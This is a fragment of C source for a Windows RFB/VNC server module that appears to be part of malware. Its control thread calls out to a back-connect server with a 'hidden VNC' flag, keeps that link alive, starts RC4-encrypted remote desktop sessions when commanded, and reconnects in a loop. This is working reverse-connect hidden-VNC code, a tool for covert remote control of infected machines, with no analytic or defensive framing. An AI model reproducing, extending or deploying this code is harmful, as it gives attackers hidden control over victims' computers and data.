	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	RfbSession->Status = Status;

	// Cleaning up RFB session
	EnterCriticalSection(&pServer->SessionListLock);
	RemoveEntryList(&RfbSession->Entry);
	LeaveCriticalSection(&pServer->SessionListLock);

	// shutdown the connection
	shutdown(RfbSession->sSocket,SD_BOTH);

	// close socket
	closesocket(RfbSession->sSocket);
	if (RfbSession->VncSession){
		VncCloseSession(RfbSession->VncSession);
	}

	// cleanup translation tables
	if (RfbSession->LocalPalette){
		hFree ( RfbSession->LocalPalette );
	}
	if (RfbSession->Transtable){
		hFree ( RfbSession->Transtable );
	}

	if ( RfbSession->hThread ){
		CloseHandle(RfbSession->hThread);
		RfbSession->hThread = NULL;
	}

	DeleteCriticalSection( &RfbSession->SendLock );
	hFree(RfbSession);

	RFB_LEAVE_WORKER();

	return(Status);
}

//
//	Creates new RFB session.
//	Starts session worker thread.
//
static WINERROR RfbAcceptSession(
	PRFB_SERVER	pServer,	// current RFB server
	DWORD		dwUnique,	// back-instance identifier
	SOCKET		sSocket,	// newly connected socket
	SOCKADDR_IN* sAddr		// newly connected network address
	)
{
	WINERROR		Status = ERROR_NOT_ENOUGH_MEMORY;
	ULONG			ThreadId;
	PRFB_SESSION	RfbSession = NULL;
	HANDLE			hCurrentThread;

	ASSERT_RFB_SERVER(pServer);

	DbgPrint("%u.%u.%u.%u:%u\n", sAddr->sin_addr.S_un.S_un_b.s_b1, sAddr->sin_addr.S_un.S_un_b.s_b2, sAddr->sin_addr.S_un.S_un_b.s_b3, sAddr->sin_addr.S_un.S_un_b.s_b4, htons(sAddr->sin_port));

	if (RfbSession = hAlloc(sizeof(RFB_SESSION)))
	{
		ZeroMemory(RfbSession, sizeof(RFB_SESSION));
		RfbSession->sSocket = sSocket;
		RfbSession->pServer = pServer;
		InitializeListHead(&RfbSession->Entry);
		InitializeCriticalSection( &RfbSession->SendLock );
		RfbSession->preferredEncoding = -1;

		// prepare backserver encryption
		prepare_rc4_key((unsigned char*)&dwUnique, sizeof(dwUnique), &RfbSession->rc4in);
		prepare_rc4_key((unsigned char*)&dwUnique, sizeof(dwUnique), &RfbSession->rc4out);

#if	_DEBUG
		RfbSession->Magic = RFB_SESSION_MAGIC;
#endif

		// Setting current thread as session worker thread
		if (RfbSession->hThread = (hCurrentThread = OpenThread(SYNCHRONIZE, FALSE, GetCurrentThreadId())))
		{
			// Inserting the session to the server's session list
			EnterCriticalSection(&pServer->SessionListLock);
			InsertTailList(&pServer->SessionListHead, &RfbSession->Entry);
			LeaveCriticalSection(&pServer->SessionListLock);

			if ((Status = RfbInitSession(RfbSession)) == NO_ERROR)
			{
				if (RfbSession->hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&RfbSessionWorker, RfbSession, 0, &ThreadId))
				{
					Status = NO_ERROR;
					CloseHandle(hCurrentThread);
				}
				else
					Status = GetLastError();
			}	// if ((Status = RfbInitSession(RfbSession)) == NO_ERROR)

			if (Status != NO_ERROR)
			{
				EnterCriticalSection(&pServer->SessionListLock);
				RemoveEntryList(&RfbSession->Entry);
				LeaveCriticalSection(&pServer->SessionListLock);
			}
		}
		else
			Status = GetLastError();
	}	// if (RfbSession = hAlloc(sizeof(RFB_SESSION)))


	if (Status != NO_ERROR)
	{
		if (RfbSession)
		{
			DeleteCriticalSection( &RfbSession->SendLock );
			hFree(RfbSession);
		}
		closesocket(sSocket);
	}

	return Status;
}

//
//	RFB server control thread.
//
static WINERROR WINAPI RfbControlThread(PRFB_SERVER pServer)
{
	WINERROR Status = NO_ERROR;

	RFB_ENTER_WORKER();
	ASSERT_RFB_SERVER(pServer);
	
	do
	{
		DWORD unique = 0;
		WORD backport = 0;
		pServer->ControlSocket = GetBackServerConnect(&pServer->ServerAddress, pServer->pClientId, backvnchidden, &backport, NULL, &unique);
		if (INVALID_SOCKET == pServer->ControlSocket)
		{
			DbgPrint("VNC: Connecting to BC server failed, status: %u\n", GetLastError());
			continue;
		}

		// работа с управляющим соединением
		SOCKADDR_IN ClientAddress;
		memcpy(&ClientAddress, &pServer->ServerAddress, sizeof(SOCKADDR_IN));
		ClientAddress.sin_port = htons(backport);

		do 
		{
			TKeepAliveMessage msg;

			SetTimeout(pServer->ControlSocket, TimeoutPingMsec);

			if (sizeof(msg) == recv(pServer->ControlSocket, (PCHAR)&msg, sizeof(msg), 0))
			{
				if (msg.status == BackNewConnection)
				{
					SOCKET ClientSocket = GetBackClientConnect(&ClientAddress);
					if (INVALID_SOCKET != ClientSocket)
					{
						SetTimeout(ClientSocket, 2 * TimeoutPingMsec);

						// Starting RFB session
						Status = RfbAcceptSession(pServer, unique, ClientSocket, &ClientAddress);
						if (Status != NO_ERROR)
						{
							DbgPrint("VNC: BC session failed, status: %u\n", Status);
							closesocket(ClientSocket);
						}

						continue;
					}

					DbgPrint("VNC: Error while processing client connection\n");
					break;
				}

				DbgPrint("VNC: Error in control connection, wrong message\n");
				break;
			}

			// ошибка или таймаут 5 минут, проверяем, живое ли соединение
			msg.status = BackKeepConnection;
			msg.unique = unique;

			SetTimeout(pServer->ControlSocket, TimeoutExtendedMsec);

			if (sizeof(msg) != send(pServer->ControlSocket, (PCHAR)&msg, sizeof(msg), 0))
			{
				DbgPrint("VNC: Error in control connection, cannot send message\n");
				break;
			}

			DbgPrint("VNC: BC control alive\n");
		} while (TRUE);

		shutdown(pServer->ControlSocket, SD_BOTH);
		closesocket(pServer->ControlSocket);
		pServer->ControlSocket = INVALID_SOCKET;
	} while ((WaitForSingleObject(pServer->hShutdownEvent, 5 * 1000) == STATUS_TIMEOUT)); // пауза между попытками подключения 5 минут

	pServer->LastError = Status = GetLastError();
	RFB_LEAVE_WORKER();

	return Status;
}

//
//	Initializes and starts RFB server.
//
WINERROR RfbStartup(PRFB_SERVER	pServer)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;

	do
	{
		if ((Status = VncStartup()) != NO_ERROR)
			break;
	
		// Initializing structures
		InitializeListHead(&pServer->SessionListHead);
		InitializeCriticalSection(&pServer->SessionListLock);

		// Creating server _shutdown event
		if (!(pServer->hShutdownEvent = CreateEvent(NULL, TRUE, FALSE, NULL)))
			break;

		// Creating server control thread
		pServer->ControlThread = CreateThread(NULL, 0, &RfbControlThread, pServer, 0, NULL);
		if (!pServer->ControlThread)
			break;

		Status = pServer->LastError;
	} while (FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	return Status;
}

//
//	Stops RFB server.
//	Cleans up all resources.
//
VOID RfbCleanup(PRFB_SERVER pServer)
{
	PLIST_ENTRY	pEntry;

	ASSERT_RFB_SERVER(pServer);

	// Make sure RBF session list was initialized completely
	if (pServer->SessionListLock.DebugInfo)
	{
		if (pServer->hShutdownEvent)
		{
			SetEvent(pServer->hShutdownEvent);
			pServer->hShutdownEvent = NULL;
		}

		if (pServer->ControlSocket)
		{
			shutdown(pServer->ControlSocket, SD_BOTH);
			closesocket(pServer->ControlSocket);
			pServer->ControlSocket = 0;
		}

		// Cleaning up all sessions
		EnterCriticalSection(&pServer->SessionListLock);

		pEntry = pServer->SessionListHead.Flink;
		while (pEntry != &pServer->SessionListHead)
		{
			PRFB_SESSION RfbSession = CONTAINING_RECORD(pEntry, RFB_SESSION, Entry);
			ASSERT_RFB_SESSION(RfbSession);

			pEntry = pEntry->Flink;

			shutdown(RfbSession->sSocket, SD_BOTH);
			CloseHandle(RfbSession->hThread);
		}

		LeaveCriticalSection(&pServer->SessionListLock);

		// We cannot wait for a thread infinitely here because this function can be called from a DLL entry where the loader lock is held.
		RfbWaitForWorkers();

		if (pServer->ControlThread)
			CloseHandle(pServer->ControlThread);
		
		if (pServer->hShutdownEvent)
			CloseHandle(pServer->hShutdownEvent);
	}

	VncCleanup();
}